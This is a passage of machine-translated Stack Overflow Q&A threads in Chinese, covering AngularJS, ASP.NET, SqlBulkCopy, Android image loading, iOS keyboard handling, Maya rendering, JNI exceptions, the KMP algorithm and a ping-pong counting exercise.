我在为迭代 javascript 对象的空 ng-repeat 打印默认文本时遇到问题。通常我只会做 a`<div ng-show="object.length==0">EMPTY SET</div>"`但你不能在 javascript 对象上调用 length 。我有一个简单的 jsfiddle 来演示这个问题：http: [//jsfiddle.net/C4t4LystX/zHJv8/8/](http://jsfiddle.net/C4t4LystX/zHJv8/8/)。基本上我只需要知道 ng-repeat 什么时候没有对象可以重复，这样我就可以显示一些默认文本。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-12T18:12:07.807

你是对的，javascript中没有object.length。因为您将源重置为空对象，所以您需要检查对象是否为空，或者有一些源。您可以编写一个名为 isEmpty 的简单函数。

```
 <div ng-show="isEmpty(sources)">
          EMPTY SOURCES
   </div>

function Ctrl1($scope) {
    $scope.sources = {source1:{id:"source1"},source2:{id:"source2"}};

    $scope.cleanSources = function(){
        $scope.sources = {};                               
    };

    $scope.isEmpty = function (obj) {
       return angular.equals({},obj); 
    };
} 
```

[http://jsfiddle.net/zHJv8/21/](http://jsfiddle.net/zHJv8/21/)

**编辑**：将 isEmpty 更改为使用 angular.equals 而不是每个循环。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:11:03.377

ng-show 使用布尔表达式，因此您只需在集合为空时将某些内容设置为 true，并在其中包含某些内容时将其设置为 false。这是一种方法的小提琴：

这是想法：

```
$scope.cleanSources = function(){
        $scope.sources = {}; 
        $scope.empty = true;    
    }; 
```

这是一个工作小提琴：http: [//jsfiddle.net/J38r2/](http://jsfiddle.net/J38r2/)

此方法不直接测试源是否为空。为此，您可以：

[http://jsfiddle.net/timothybone/HXgbR/4/](http://jsfiddle.net/timothybone/HXgbR/4/)

当然，文档显示了相同的想法： [http ://docs.angularjs.org/api/ng.directive:ngShow](http://docs.angularjs.org/api/ng.directive:ngShow)

# asp.net - ASP.NET 站点确定是否在测试与生产环境上运行

> ID：13845411
> 
> 赞同：0
> 
> 时间：2012-12-12T17:35:14.080
> 
> 标签：asp.net, deployment, development-environment, production-environment

我有一个在测试、登台和生产中部署的 Webforms 站点。

一些内部用户难以跟踪他们所在的站点。

我有一个母版页和每个页面的通用页眉/页脚。

如何在这些环境中的页面上显示“TEST”或“STAGING”之类的文本，但仍然能够将相同的代码库部署到生产环境中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:41:21.777

使用 Request.ServerVariables("SERVER_NAME") 并创建一些 if 逻辑来更改您的页面标题（或您想要使用的任何指标）来表示 dev 或 test（我通常将 prod 留空）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T20:00:27.517

区分这两种环境的最简单方法是为每种环境使用不同的横幅。或者，使用描述性 URL，例如：

staging.mydomain.com

prod.mydomain.com

# collation - SqlBulkCopy 无法获取目标表的列排序规则信息

> ID：13845412
> 
> 赞同：0
> 
> 时间：2012-12-12T17:35:15.953
> 
> 标签：collation, sqlbulkcopy

当我尝试通过 SqlBulkCopy 和 DataTable 对象将行写入表时出现此错误。

在继续之前，让我说我知道下面的 Microsoft 知识库文章。关于此错误的每篇文章都引用了该文章。但是，我的表或模式名称中没有点。该表存在于用户帐户的默认架构中，因此仅表名就足够了。

[http://support.microsoft.com/kb/944389](http://support.microsoft.com/kb/944389)

这是执行批量写入操作的代码：

```
SqlConnection cn = new SqlConnection(cs);
cn.Open();

SqlTransaction tr = cn.BeginTransaction();

try
{
    using (SqlBulkCopy copy = new SqlBulkCopy(cn, SqlBulkCopyOptions.Default, tr))
    {
        copy.DestinationTableName = CircCountTableName;
        copy.ColumnMappings.Add("CirculationRangeID", "CirculationRangeID");
        copy.ColumnMappings.Add("GeographyID", "GeographyID");
        copy.ColumnMappings.Add("CircCountModelID", "CircCountModelID");
        copy.ColumnMappings.Add("Monday", "Monday");
        copy.ColumnMappings.Add("Tuesday", "Tuesday");
        copy.ColumnMappings.Add("Wednesday", "Wednesday");
        copy.ColumnMappings.Add("Thursday", "Thursday");
        copy.ColumnMappings.Add("Friday", "Friday");
        copy.ColumnMappings.Add("Saturday", "Saturday");
        copy.ColumnMappings.Add("Sunday", "Sunday");
        copy.ColumnMappings.Add("DataSource", "DataSource");
        copy.ColumnMappings.Add("DataSourceID", "DataSourceID");
        copy.ColumnMappings.Add("CreateDate", "CreateDate");
        copy.ColumnMappings.Add("LastUpdateDate", "LastUpdateDate");
        copy.ColumnMappings.Add("LastUpdateUser", "LastUpdateUser");

        copy.WriteToServer(circCounts);

        tr.Commit();
    }
}
catch (Exception ex)
{
    tr.Rollback();
}
finally
{
    cn.Close();
} 
```

当原因不是点符号时，还有其他人遇到过这个问题吗？我怀疑这是一个权限问题，但我并不完全相信。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T15:16:39.790

我不知道为什么这会有所不同，但是当我为用于连接到数据库的帐户授予授予视图定义权限的权利时 - 在数据库属性/权限下 - 错误消失了。

# python-2.7 - 给定一组点，找到最小的点子集，从中可以画出直径为 n 的圆来包含所有点

> ID：13845416
> 
> 赞同：0
> 
> 时间：2012-12-12T17:35:44.810
> 
> 标签：python-2.7, geometry, latitude-longitude

我有一个包含相关纬度/经度数据（站点）的地点列表。我试图找到最少的访问站点的基地（最大限度地减少旅行发生）。有任何想法吗？我大部分时间都在使用 Python (2.7.3)，但欢迎提供任何建议/示例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:42:54.247

这可以看作是[集合覆盖问题](http://en.wikipedia.org/wiki/Set_cover_problem)。

使用维基百科的术语，你的宇宙将是城市。如果有`m`城市，就会有`m`集。`k`-th 集将对应于`k`-th 城市，并将包括所需旅行半径范围内的所有城市`k`，包括`k`它自己。任务是找到覆盖宇宙的最少数量的集合（换句话说，你可以到达宇宙中每个城市的最少城市）。

坏消息是这个问题是 NP 难的。但是，有[启发式方法](http://en.wikipedia.org/wiki/Set_cover_problem#Greedy_algorithm)。

# android - 从 url 获取多个图像

> ID：13845421
> 
> 赞同：0
> 
> 时间：2012-12-12T17:35:58.490
> 
> 标签：android, inputstream, urlconnection

我有一个允许下载 3 张图像并将它们显示到画廊中的应用程序为了做到这一点，我使用一个线程来下载图像和一个处理程序以便将图像放入画廊

问题是图像没有显示（图像视图为空）到画廊中（即使我看到我的 3 个图像的 3 个图像视图）

我不知道这是因为连接很慢（我在手机上开发）还是因为在下载图像之前显示了ui

非常感谢您的帮助

```
public class ChoiceLanguage extends Activity {
    private TextView nomLangue;

    private ArrayList<Language> listeLangues;
    private ArrayList<String> listImages;
    private Gallery gallery;
    private String URL="******************";
    private Drawable mNoImage;
    Bitmap bitmap;
    ImageView imgView = null;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.choice_language);

        listeLangues= getIntent().getParcelableArrayListExtra("listeLangues");
        listImages=buildListImages();

        gallery = (Gallery) findViewById(R.id.galleryImg);

        gallery.setAdapter(new AddImgAdp(this));

        gallery.setSpacing(10);

        gallery.setOnItemClickListener(new OnItemClickListener() {
            public void onItemClick(AdapterView parent, View v, int position, long id) {            

                 System.out.println("URL "+ listImages.get(position) );
            }
        });

}

    private InputStream openHttpConnection(String urlString) throws IOException {
        InputStream in = null;

        URL url = new URL(urlString);
        URLConnection conn = url.openConnection();
        conn.connect();
        in=conn.getInputStream();
        return in;
    }

    private Bitmap downloadImage( ImageView iView, String url) {
        Bitmap bitmap = null;
        InputStream in = null;
        BufferedInputStream bis ;
        try {

            in = openHttpConnection(url);
            bis= new BufferedInputStream(in, 8192);
            bitmap = BitmapFactory.decodeStream(bis);
            bis.close();
            in.close();

        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        return bitmap;

    }

    private ArrayList<String> buildListImages() {
        ArrayList<String> listImg = new ArrayList<String>();
        for(Language l : listeLangues) {
            listImg.add(URL+l.getImagePath());

        }   

        return listImg;
    }

    public class AddImgAdp extends BaseAdapter {
        int GalItemBg;
        private Context cont;

        public AddImgAdp(Context c) {
            cont = c;
            TypedArray typArray = obtainStyledAttributes(R.styleable.GalleryTheme);
            GalItemBg = typArray.getResourceId(R.styleable.GalleryTheme_android_galleryItemBackground, 0);
            typArray.recycle();
        }

        public int getCount() {
            return listImages.size();
        }

        public Object getItem(int position) {
            return position;
        }

        public long getItemId(int position) {
            return position;
        }

        public View getView(final int position, View convertView, ViewGroup parent) {

            if (convertView == null) {
                imgView = new ImageView(cont);
            } else {
                imgView = (ImageView)convertView;
            }

            ThreadDownload progressDl= new ThreadDownload(position);
            progressDl.start();

            imgView.setLayoutParams(new Gallery.LayoutParams(150, 150));
            imgView.setScaleType(ImageView.ScaleType.FIT_XY);
            imgView.setBackgroundResource(GalItemBg);

            return imgView;
        }
    }
    private class SetImg extends Handler {

        public void handleMessage(Message msg) {

            imgView.setImageBitmap(bitmap);
        }
    }
    private class ThreadDownload extends Thread {
        SetImg img= new SetImg();
        int position ;
        public ThreadDownload(int position)
        {
            super();
            this.position=position;
        }
        public void run() {
         bitmap = downloadImage(imgView,listImages.get(position));      
         img.sendEmptyMessage(0);
        }
       }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:48:45.900

您可以使用 SmartImageView，它是 Android 标准 ImageView 的替代品，它还允许从 URL 或用户的联系人地址簿加载图像。图像缓存到内存和磁盘以实现超快速加载。

[https://github.com/loopj/android-smart-image-view](https://github.com/loopj/android-smart-image-view)

# iphone - 通用 UITableView 键盘大小调整算法

> ID：13845426
> 
> 赞同：10
> 
> 时间：2012-12-12T17:36:36.787
> 
> 标签：iphone, ios, ipad, uitableview

我已经搜索了很多代码来调整表格视图的大小以适应键盘显示和隐藏，但是我遇到的几乎每一篇文章都假设表格视图正在占据其视图控制器的整个视图。我有一个 iPad 应用程序，其中表格视图只占屏幕的一部分。在这种情况下调整表格视图大小的正确方法是什么？（我上面提到的帖子中的所有代码都失败了）

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-13T19:36:02.270

以下代码可以满足您的需求，并适用于任何设备和任何布局。该代码由[Sensible TableView 框架](http://sensiblecocoa.com)提供（具有复制和使用权限）。

```
- (void)keyboardWillShow:(NSNotification *)aNotification
{
if(keyboardShown) 
    return;

keyboardShown = YES;

// Get the keyboard size
UIScrollView *tableView;
if([self.tableView.superview isKindOfClass:[UIScrollView class]])
    tableView = (UIScrollView *)self.tableView.superview;
else
    tableView = self.tableView;
NSDictionary *userInfo = [aNotification userInfo];
NSValue *aValue = [userInfo objectForKey:UIKeyboardFrameEndUserInfoKey];
CGRect keyboardRect = [tableView.superview convertRect:[aValue CGRectValue] fromView:nil];

// Get the keyboard's animation details
NSTimeInterval animationDuration;
[[userInfo objectForKey:UIKeyboardAnimationDurationUserInfoKey] getValue:&animationDuration];
UIViewAnimationCurve animationCurve;
[[userInfo objectForKey:UIKeyboardAnimationCurveUserInfoKey] getValue:&animationCurve];

// Determine how much overlap exists between tableView and the keyboard
CGRect tableFrame = tableView.frame;
CGFloat tableLowerYCoord = tableFrame.origin.y + tableFrame.size.height;
keyboardOverlap = tableLowerYCoord - keyboardRect.origin.y;
if(self.inputAccessoryView && keyboardOverlap>0)
{
    CGFloat accessoryHeight = self.inputAccessoryView.frame.size.height;
    keyboardOverlap -= accessoryHeight;

    tableView.contentInset = UIEdgeInsetsMake(0, 0, accessoryHeight, 0);
    tableView.scrollIndicatorInsets = UIEdgeInsetsMake(0, 0, accessoryHeight, 0);
}

if(keyboardOverlap < 0)
    keyboardOverlap = 0;

if(keyboardOverlap != 0)
{
    tableFrame.size.height -= keyboardOverlap;

    NSTimeInterval delay = 0;
    if(keyboardRect.size.height)
    {
        delay = (1 - keyboardOverlap/keyboardRect.size.height)*animationDuration;
        animationDuration = animationDuration * keyboardOverlap/keyboardRect.size.height;
    }

    [UIView animateWithDuration:animationDuration delay:delay 
                        options:UIViewAnimationOptionBeginFromCurrentState 
                     animations:^{ tableView.frame = tableFrame; } 
                     completion:^(BOOL finished){ [self tableAnimationEnded:nil finished:nil contextInfo:nil]; }];
}
}

- (void)keyboardWillHide:(NSNotification *)aNotification
{
if(!keyboardShown)
    return;

keyboardShown = NO;

UIScrollView *tableView;
if([self.tableView.superview isKindOfClass:[UIScrollView class]])
    tableView = (UIScrollView *)self.tableView.superview;
else
    tableView = self.tableView;
if(self.inputAccessoryView)
{
    tableView.contentInset = UIEdgeInsetsZero;
    tableView.scrollIndicatorInsets = UIEdgeInsetsZero;
}

if(keyboardOverlap == 0)
    return;

// Get the size & animation details of the keyboard
NSDictionary *userInfo = [aNotification userInfo];
NSValue *aValue = [userInfo objectForKey:UIKeyboardFrameEndUserInfoKey];
CGRect keyboardRect = [tableView.superview convertRect:[aValue CGRectValue] fromView:nil];

NSTimeInterval animationDuration;
[[userInfo objectForKey:UIKeyboardAnimationDurationUserInfoKey] getValue:&animationDuration];
UIViewAnimationCurve animationCurve;
[[userInfo objectForKey:UIKeyboardAnimationCurveUserInfoKey] getValue:&animationCurve];

CGRect tableFrame = tableView.frame; 
tableFrame.size.height += keyboardOverlap;

if(keyboardRect.size.height)
    animationDuration = animationDuration * keyboardOverlap/keyboardRect.size.height;

[UIView animateWithDuration:animationDuration delay:0 
                    options:UIViewAnimationOptionBeginFromCurrentState 
                 animations:^{ tableView.frame = tableFrame; } 
                 completion:nil];
}

- (void) tableAnimationEnded:(NSString*)animationID finished:(NSNumber *)finished contextInfo:(void *)context
{
// Scroll to the active cell
if(self.activeCellIndexPath)
{
    [self.tableView scrollToRowAtIndexPath:self.activeCellIndexPath atScrollPosition:UITableViewScrollPositionNone animated:YES];
    [self.tableView selectRowAtIndexPath:self.activeCellIndexPath animated:NO scrollPosition:UITableViewScrollPositionNone];
}
} 
```

笔记：

一个。上面两个方法已经被添加到通知中心，使用如下代码：

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillShow:) name:UIKeyboardWillShowNotification object:nil];
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillHide:) name:UIKeyboardWillHideNotification object:nil]; 
```

湾。上面使用的 ivars 声明如下：

```
BOOL keyboardShown;
CGFloat keyboardOverlap; 
```

C。'self.activeCellIndexPath' 始终设置为拥有当前活动 UITextField/UITextView 的单元格的 indexPath。

享受！:)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-10-29T14:06:22.300

我发现最简单的解决方案就是这个（我不喜欢使用子视图来处理这种东西）：

注册键盘框架更改通知（最好在 viewWillAppear 中注册：并在 viewWillDisappear 中取消注册：）：

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardDidChangeFrame:) name:UIKeyboardDidChangeFrameNotification object:nil]; 
```

然后在方法中：

```
- (void)keyboardDidChangeFrame:(NSNotification*)aNotification
{
    NSDictionary* info = [aNotification userInfo];
    UIWindow *window = [[[UIApplication sharedApplication] delegate] window];
    CGRect kbFrame = [[info objectForKey:UIKeyboardFrameEndUserInfoKey] CGRectValue];
    CGRect kbIntersectFrame = [window convertRect:CGRectIntersection(window.frame, kbFrame) toView:self.scrollView];
    kbIntersectFrame = CGRectIntersection(self.bounds, kbIntersectFrame);

    UIEdgeInsets contentInsets = UIEdgeInsetsMake(0.0, 0.0, kbIntersectFrame.size.height, 0.0);
    self.scrollView.contentInset = contentInsets;
    self.scrollView.scrollIndicatorInsets = contentInsets;
} 
```

或者如果您想在更改 contentInset 后摆脱“跳转”：

```
- (void)keyboardDidChangeFrame:(NSNotification*)aNotification
{
    NSDictionary* info = [aNotification userInfo];
    UIWindow *window = [[[UIApplication sharedApplication] delegate] window];
    CGRect kbFrame = [[info objectForKey:UIKeyboardFrameEndUserInfoKey] CGRectValue];
    CGRect kbIntersectFrame = [window convertRect:CGRectIntersection(window.frame, kbFrame) toView:self.scrollView];
    kbIntersectFrame = CGRectIntersection(self.scrollView.bounds, kbIntersectFrame);

    // get point before contentInset change
    CGPoint pointBefore = self.scrollView.contentOffset;
    UIEdgeInsets contentInsets = UIEdgeInsetsMake(0.0, 0.0, kbIntersectFrame.size.height, 0.0);
    self.scrollView.contentInset = contentInsets;
    self.scrollView.scrollIndicatorInsets = contentInsets;
    // get point after contentInset change
    CGPoint pointAfter = self.scrollView.contentOffset;
    // avoid jump by settings contentOffset
    self.scrollView.contentOffset = pointBefore;
    // and now animate smoothly
    [self.scrollView setContentOffset:pointAfter animated:YES];
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-02-21T08:35:09.880

简单的解决方案是将我的扩展添加`UIViewController+Keyboard.swift`到您的项目中，只需一行`setupKeyboardNotifcationListenerForScrollView(tableView)`，它将自动调整大小。不需要子类化任何东西，只是一个扩展！[它在SingleLineKeyboardResize](https://github.com/haaakon/SingleLineKeyboardResize)上的开源

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-12T18:24:30.710

简单的解决方案 - 注册以在 init 或 viewDidLoad 上接收键盘通知：

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                       selector:@selector(keyboardWillShow:)
                                           name:UIKeyboardWillShowNotification
                                         object:nil];
[[NSNotificationCenter defaultCenter] addObserver:self
                                       selector:@selector(keyboardWillHide:)
                                           name:UIKeyboardWillHideNotification
                                         object:nil]; 
```

然后当收到通知时，您可以使用给定的键盘矩形来调整 tableView 的框架：

```
- (void)keyboardWillShow:(NSNotification *)notification
{
   // Get the size of the keyboard.
   CGSize keyboardSize = [[[notification userInfo] objectForKey:UIKeyboardFrameBeginUserInfoKey] CGRectValue].size;

   CGRect newTableFrame = _myTableView.frame;
   //Here make adjustments to the tableview frame based on the value in keyboard size
   ...

   _myTableView.frame = newTableFrame;
}

- (void)keyboardWillHide:(NSNotification *)notification
{
   //Here change the table frame back to what it originally was.
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-12T18:16:27.100

[看看这个项目](https://github.com/michaeltyson/TPKeyboardAvoiding)，它是拖放的，所以只需将 tablview 声明为类型`TPKeyboardAvoidingTableView`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-08-16T19:50:33.670

[你可以通过使用IQKeyboardManager](https://github.com/hackiftekhar/IQKeyboardManager)来实现你想要的，它是一个无代码库，你只需将它添加到你的 Podfile: pod 'IQKeyboardManager' 就是这样，当键盘显示时它会处理滚动效果，即使UITextField/UITextView 不是 scrollView/tableView 的一部分。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-02-03T07:14:40.840

这是键盘方法：

```
func keyboardControl(notification: NSNotification, isShowing: Bool) {
    var userInfo = notification.userInfo!
    let keyboardRect = userInfo[UIKeyboardFrameEndUserInfoKey]!.CGRectValue
    let curve = userInfo[UIKeyboardAnimationCurveUserInfoKey]!.unsignedIntValue

    let convertedFrame = self.view.convertRect(keyboardRect, fromView: nil)
    let heightOffset = self.view.bounds.size.height - convertedFrame.origin.y
    let options = UIViewAnimationOptions(rawValue: UInt(curve) << 16)
    let duration = userInfo[UIKeyboardAnimationDurationUserInfoKey]!.doubleValue

    //your UITableView bottom constrant
    self.tableViewMarginBottomConstraint.constant = heightOffset

    var contentInsets = UIEdgeInsetsZero
    if isShowing {
        contentInsets = UIEdgeInsetsMake(0.0, 0.0, (keyboardRect.size.height), 0.0)
    }

    UIView.animateWithDuration(
        duration,
        delay: 0,
        options: options.union(.LayoutSubviews).union(.BeginFromCurrentState),
        animations: {
            self.listTableView.contentInset = contentInsets
            self.listTableView.scrollIndicatorInsets = contentInsets
            self.listTableView.scrollBottomToLastRow()
            self.view.layoutIfNeeded()
        },
        completion: { bool in
    })
} 
```

这是UITableView的扩展：</p>

```
extension UITableView {
    func totalRows() -> Int {
        var i = 0
        var rowCount = 0
        while i < self.numberOfSections {
            rowCount += self.numberOfRowsInSection(i)
            i++
        }
        return rowCount
    }

    var lastIndexPath: NSIndexPath {
        get { return NSIndexPath(forRow: self.totalRows()-1, inSection: 0) }
    }

    func scrollBottomToLastRow() {
        self.scrollToRowAtIndexPath(self.lastIndexPath, atScrollPosition: .Bottom, animated: false)
    }
} 
```

# python - maya python api - 渲染相机并存储在变量中

> ID：13845427
> 
> 赞同：3
> 
> 时间：2012-12-12T17:36:40.657
> 
> 标签：python, maya, autodesk, mel

我正在使用 Maya 2012，我想做的是渲染相机视图。我发现可以使用 MEL 命令“render”（通过 python 调用它）来执行此操作。但是，据我所知，此命令会渲染图像并将其保存到磁盘，同时仅返回保存图像的路径。

例子：

```
import maya.cmds as cmds
import cv2 as cv

pathToFile = cmds.render()
renderImage = cv.imread(pathToFile) 
```

由于我对使用图像执行各种计算机视觉算法感兴趣，将其保存到磁盘然后从磁盘读取它会产生不必要的计算开销。

是否可以渲染相机并将图像存储在变量中而无需这样做？这将允许在渲染和分析渲染图像之间更快地循环。

* * *

万一将来有人遇到这个问题：不幸的是，我尝试了建议的 ram 磁盘方法（使用 dataram RAMDisk），但它没有产生任何速度提升。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T10:26:26.947

如果您正在寻找效率，您可以考虑使用这些`OpenMaya`包来访问视图的 OpenGL 上下文并将 Viewport 2.0 视图渲染为纹理。然后以编程方式访问该纹理。

或者，您可以编写一个插件来包装另一个渲染插件，如 Mayatomr 或 Hardware 2.0 渲染器，并将渲染图像放入某个共享内存空间。

但这些解决方案涉及的内容非常多，涉及许多未记录的功能。您可能应该将渲染器设置为硬件 2.0，将图像保存为 BMP（无论如何 OpenCV 读取速度非常快），或者像上面建议的那样保存到 RAM 磁盘，然后就可以结束了。

**修正案**

也许有更简单的方法。创建一个实现`MPxHardwareShader`此处描述的规范的自定义节点：

[http://images.autodesk.com/adsk/files/viewport_2_0_api_gold.pdf](http://images.autodesk.com/adsk/files/viewport_2_0_api_gold.pdf)

换句话说，覆盖某个节点的 Hardware / Viewport 2.0 渲染。无需实际绘制某些东西，而是使用您对 OpenGL 上下文的访问将视口渲染为纹理。

[http://www.opengl-tutorial.org/intermediate-tutorials/tutorial-14-render-to-texture/](http://www.opengl-tutorial.org/intermediate-tutorials/tutorial-14-render-to-texture/)

然后用它做任何你想做的事情。聪明，嗯？

# java - 使用 JNI 的 Java 代码流

> ID：13845430
> 
> 赞同：4
> 
> 时间：2012-12-12T17:36:51.847
> 
> 标签：java, exception, java-native-interface

我有 JNI 级别的代码。它可以抛出异常。代码是：

```
#include "JavaGlueClass.h"
#include <stdio.h>         
#include <windows.h>
#include <string.h>

jint throwNoClassDefError(JNIEnv *env, const char *message)
{
    jclass exClass;
    char *className = (char *) "java/lang/NoClassDefFoundError" ;

    exClass = env->FindClass(className);

    if ( exClass != NULL ) {
        return env->ThrowNew(exClass, message);
    }

    //free the local ref 
    env->DeleteLocalRef(exClass);

}

void throwGetFieldIDException(JNIEnv *env)
{
    const char *className = "GetFieldIDException";
    jclass exClass = env->FindClass(className);
    if (exClass == NULL) {
        throwNoClassDefError(env, className);
    } else {
        env->ThrowNew(exClass, "GetFieldIDException message");
    }
    env->DeleteLocalRef(exClass);
    printf("printprint");
}

JNIEXPORT jobject JNICALL Java_JavaGlueClass_test(JNIEnv *env, jobject obj) 
{
    jmethodID constructor;
    jobject object;
    jclass clazz;
    jfieldID fid;
    jstring stringField;

    clazz = env->FindClass("Information"); 
    if (clazz == 0) {
        printf("error while finding class");
        throwNoClassDefError(env, "no such class");
    } else {                
        //create object throuht constructor
        constructor = env->GetMethodID(clazz, "<init>", "()V");  
        object = env->NewObject(clazz, constructor);    

        // set private value1 field 
        stringField = env->NewStringUTF("str1");
        //fid = env->GetFieldID(clazz,"value1","Ljava/lang/String;");
        fid = NULL;
        if (fid == NULL) {
            throwGetFieldIDException(env, "error with value1 field.");
            //return NULL;
        }

        env->SetObjectField(object, fid, stringField);

        //set private value2 field
        fid = env->GetFieldID(clazz,"value2","I");
        if (fid == NULL) {
            throwGetFieldIDException(env, "error with value1 field.");
            //return NULL;
        }
        env->SetIntField(object, fid, 1); 

        // set private value3 field 
        stringField = env->NewStringUTF("str2");
        fid = env->GetFieldID(clazz,"value3","Ljava/lang/String;");
        if (fid == NULL) {
            throwGetFieldIDException(env, "error with value1 field.");
            //return NULL;
        }
        env->SetObjectField(object, fid, stringField);

        //set private value4 field
        fid = env->GetFieldID(clazz,"value4","I");
        if (fid == NULL) {
            throwGetFieldIDException(env, "error with value1 field.");
            //return NULL;
        }
        env->SetIntField(object, fid, 2); 

        printf("end of cpp function");              
        return object;
    }

} 
```

Java_JavaGlueClass_test 函数创建自定义信息类的对象。每次我设置类字段时，都会检查“fid”是否为空。我阅读了有关 JNI 异常的信息，这些异常是待处理的异常。我发现将抛出的第一个异常将代码流移动到 Java 级别（而不是 JNI 级别）。但是 JNI 级别的异常之后的其余代码呢？据我了解，它将被执行。是否有可能在第一个异常之后引发第二个、第三个等异常？为了不执行 JNI 级别的其余代码，我是否应该在抛出异常后返回 NULL 或其他内容？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T17:51:31.007

从[JNI 规范](http://web.archive.org/web/20080601040320/http://java.sun.com/docs/books/jni/html/exceptions.html)：

> 通过 JNI 引发的未决异常（例如，通过调用 ThrowNew）不会立即中断本机方法的执行。这与 Java 编程语言中异常的行为方式不同。当 Java 编程语言中抛出异常时，虚拟机会自动将控制流转移到最近的与异常类型匹配的封闭 try/catch 语句。然后虚拟机清除挂起的异常并执行异常处理程序。相反，JNI 程序员必须在异常发生后显式地实现控制流。

# string - KMP 前缀表直觉

> ID：13845435
> 
> 赞同：4
> 
> 时间：2012-12-12T17:37:18.320
> 
> 标签：string, algorithm, data-structures, pattern-matching, knuth-morris-pratt

如我所见，在 KMP 中构建故障/前缀表的主要功能（在所有在线资源中，即使在此[答案](https://stackoverflow.com/questions/13792118/kmp-prefix-table/13792133#comment18969510_13792133)中_ 如下：

```
int j = 0;  
    for (int i = 1; i < pattern.length(); i++) {  
      while (j > 0 && pattern.charAt(j) != pattern.charAt(i)) {   
        j = failure[j - 1];  
      }  
      if (pattern.charAt(j) == pattern.charAt(i)) {   
        j++;   
      }  
      failure[i] = j;  
    } 
```

我无法理解这部分：
`j = failure[j - 1];`

为什么我们不这样做，`j--`而不是返回字符串？我们如何知道`j`使用失败的表进行更新是正确的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:19:09.167

如果故障表的第 i 个条目是长度为 i 的模式的前缀的最长后缀-前缀匹配的长度，则 KMP 字符串匹配是正确的。

请注意，如果`A[0..k]`是 的后缀-前缀匹配`A[0..i]`，则`A[0..k]`要么是 的最长后缀-前缀匹配，要么是`A[0..i]`所述最长后缀-前缀匹配的后缀-前缀匹配。

当你把这两件事放在一起时，结果证明我们想要`failure[i]`的是 的最长后缀-前缀匹配的长度`pattern[0..i]`。KMP 预处理`failure`以归纳方式构建，使用以下事实：

如果 的 最长的后缀-前缀匹配`A[0..i]`是非空的，则砍掉最后一个字符将给出 的一些后缀-前缀匹配`A[0..i-1]`。

因此，最长的后缀-前缀匹配`A[0..i]`要么是空的，要么是通过将最长的后缀-前缀匹配`A[0..i-1]`扩展一个字符或将该最长后缀-前缀匹配的后缀-前缀匹配扩展一个字符而形成的。前面字符的失败函数为您提供了一种简单的方法来*迭代*`pattern[0..i-1]`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-02-06T19:41:22.647

这个视频真的有助于让直觉清楚为什么我们需要做 j = failure[j - 1]; 而不是 j--;

[https://www.youtube.com/watch?v=tWDUjkMv6Lc&feature=emb_logo](https://www.youtube.com/watch?v=tWDUjkMv6Lc&feature=emb_logo)

# javascript - 从 1 到 100，如果是 3 的倍数则打印“ping”，如果是 5 的倍数则打印“pong”，否则打印数字

> ID：13845437
> 
> 赞同：13
> 
> 时间：2012-12-12T17:37:29.590
> 
> 标签：javascript, fizzbuzz

我刚面试完回家，面试官让我写一个程序：

它应该从 1 数到 100，然后打印...

如果是 3 的倍数，“ping”
如果是 5 的倍数，“pong”
否则，打印数字。

如果它是 3 和 5 的倍数（如 15），它应该打印“ping”和“pong”。

我选择了 Javascript，并想出了这个：

```
for (x=1; x <= 100; x++){
    if( x % 3 == 0 ){
        write("ping")
    }
    if( x % 5 == 0 ){
        write("pong")
    }
    if( ( x % 3 != 0 ) && ( x % 5 != 0 ) ){
        write(x)
    }
} 
```

实际上，我对我的解决方案非常不满意，但我想不出更好的解决方案。

有谁知道更好的方法来做到这一点？它检查了两次，我不喜欢它。我在家里进行了一些测试，但没有成功，这是唯一一个返回正确答案的...

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-12-12T17:47:53.460

恕我直言，您的解决方案非常令人满意。艰难，因为半数既不是 3 也不是 5 的倍数，我会反过来说：

```
for (var x=1; x <= 100; x++){
    if( x % 3 && x % 5 ) {
        document.write(x);
    } else {
        if( x % 3 == 0 ) {
            document.write("ping");
        }
        if( x % 5 == 0 ) {
            document.write("pong");
        }
    }
    document.write('<br>'); //line breaks to enhance output readability
}​ 
```

[**小提琴**](http://jsfiddle.net/7tXuP/9/)

另外，请注意除`0`and之外的任何数字`NaN`都是真实值，因此我删除了不必要`!= 0`的括号和一些括号对。

* * *

这是另一个版本，它不会进行两次相同的模运算，但需要存储一个变量：

```
for (var x=1; x <= 100; x++) {
    var skip = 0;
    if (x % 3 == 0) {
        document.write('ping');
        skip = 1;
    }
    if (x % 5 == 0) {
        document.write('pong');
        skip = 1;
    }
    if (!skip) {
        document.write(x);
    }
    document.write('<br>'); //line breaks to enhance output readability
} 
```

[**小提琴**](http://jsfiddle.net/7tXuP/10/)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-12T19:32:18.040

这是我的单线：

```
for(var x=1;x<101;x++)document.write((((x%3?'':'ping')+(x%5?'':'pong'))||x)+'<br>'); 
```

